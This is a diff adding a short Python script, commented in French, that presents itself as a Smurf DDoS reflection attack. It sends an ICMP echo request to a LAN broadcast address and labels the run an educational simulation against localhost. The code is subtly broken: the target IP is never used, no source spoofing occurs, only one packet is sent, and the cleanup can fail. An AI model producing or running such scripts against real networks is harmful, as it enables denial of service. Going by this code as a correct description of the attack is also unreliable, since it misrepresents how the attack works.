@@ -1,0 +1,21 @@
+# DDOS - Attaques par réflexion (Smurf Attack)
+
+import socket
+
+def smurf_attack(target_ip, broadcast_ip):
+    print(f"Lancement d'une attaque Smurf sur {target_ip} via {broadcast_ip}...")
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+        packet = b"\x08\x00\x7d\x4b\x00\x00\x00\x00Ping"  # Paquet ICMP Echo Request
+        sock.sendto(packet, (broadcast_ip, 0))
+    except Exception as e:
+        print(f"Erreur lors de l'envoi des paquets ICMP: {e}")
+    finally:
+        sock.close()
+
+# Paramètres de l'attaque simulée (à des fins éducatives uniquement)
+target_ip = "127.0.0.1"  # Adresse IP de la cible (localhost dans cet exemple)
+broadcast_ip = "192.168.1.255"  # Adresse de diffusion (broadcast)
+
+# Lancer l'attaque simulée
+smurf_attack(target_ip, broadcast_ip)
